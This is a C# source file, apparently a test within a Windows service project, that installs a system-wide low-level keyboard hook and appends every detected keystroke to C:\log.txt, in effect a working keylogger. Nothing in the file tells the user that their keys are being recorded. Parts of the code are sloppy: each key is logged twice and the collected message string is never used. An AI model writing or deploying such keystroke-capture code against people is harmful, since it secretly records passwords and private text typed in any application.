using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace WindowsServiceTest
{
    public static class Windowshook
    {
        public delegate int HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static int m_HookHandle { get; set; } = 0;   // Hook handle

        private const int WH_KEYBOARD_LL = 13;

        private static HookProc m_KbdHookProc;            // 鍵盤掛鉤函式指標

        private static string message = "";

        public static void SetWindowsHook()
        {
            if (m_HookHandle == 0)
            {
                writeLog("setWindowsHook");
                using (Process curProcess = Process.GetCurrentProcess())

                using (ProcessModule curModule = curProcess.MainModule)

                {
                    m_KbdHookProc = new HookProc(Windowshook.KeyboardHookProc);

                    m_HookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, m_KbdHookProc,

                         GetModuleHandle(curModule.ModuleName), 0);
                }

                if (m_HookHandle == 0)
                    return;
            }
        }

        // 設置掛鉤.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn,
        IntPtr hInstance, int threadId);

        // 將之前設置的掛鉤移除。記得在應用程式結束前呼叫此函式.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
        public static extern bool UnhookWindowsHookEx(int idHook);

        // 呼叫下一個掛鉤處理常式（若不這麼做，會令其他掛鉤處理常式失效）.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
        public static extern int CallNextHookEx(int idHook, int nCode,
        IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static int KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // 當按鍵按下及鬆開時都會觸發此函式，這裡只處理鍵盤按下的情形。
            //bool isPressed = (lParam.ToInt32() & 0x80000000) == 0;

            if (nCode < 0)
            {
                return CallNextHookEx(m_HookHandle, nCode, wParam, lParam);
            }

            Keys a = KeyboardInfo.GetKey();
            writeLog(a.ToString());

            if (a != Keys.None && a != Keys.Return)
            {
                message += a.ToString();
                writeLog(a.ToString());
            }

            return CallNextHookEx(m_HookHandle, nCode, wParam, lParam);
        }

        public static void writeLog(string data) //寫log
        {
            using (StreamWriter sw = File.AppendText("C:\\log.txt"))
            {
                sw.WriteLine(data);
            }

        }
    }

    public class KeyboardInfo
    {
        private KeyboardInfo()
        {
        }

        [DllImport("user32")]
        private static extern short GetKeyState(int vKey);

        public static Keys GetKey()
        {
            foreach (Keys key in (Keys[])Enum.GetValues(typeof(Keys)))
            {
                KeyStateInfo keyState = GetKeyState(key);

                if (keyState.IsPressed)
                    return keyState.Key;
            }

            return Keys.None;
        }

        public static KeyStateInfo GetKeyState(Keys key)
        {
            int vkey = (int)key;

            if (key == Keys.Alt)
            {
                vkey = 0x12;    // VK_ALT
            }

            short keyState = GetKeyState(vkey);
            int low = Low(keyState);
            int high = High(keyState);
            bool toggled = (low == 1);
            bool pressed = (high == 1);

            return new KeyStateInfo(key, pressed, toggled);
        }

        private static int High(int keyState)
        {
            if (keyState > 0)
            {
                return keyState >> 0x10;
            }
            else
            {
                return (keyState >> 0x10) & 0x1;
            }
        }

        private static int Low(int keyState)
        {
            return keyState & 0xffff;
        }
    }

    public struct KeyStateInfo
    {
        private Keys m_Key;
        private bool m_IsPressed;
        private bool m_IsToggled;

        public KeyStateInfo(Keys key, bool ispressed, bool istoggled)
        {
            m_Key = key;
            m_IsPressed = ispressed;
            m_IsToggled = istoggled;
        }

        public static KeyStateInfo Default
        {
            get
            {
                return new KeyStateInfo(Keys.None, false, false);
            }
        }

        public Keys Key
        {
            get { return m_Key; }
        }

        public bool IsPressed
        {
            get { return m_IsPressed; }
        }

        public bool IsToggled
        {
            get { return m_IsToggled; }
        }
    }
}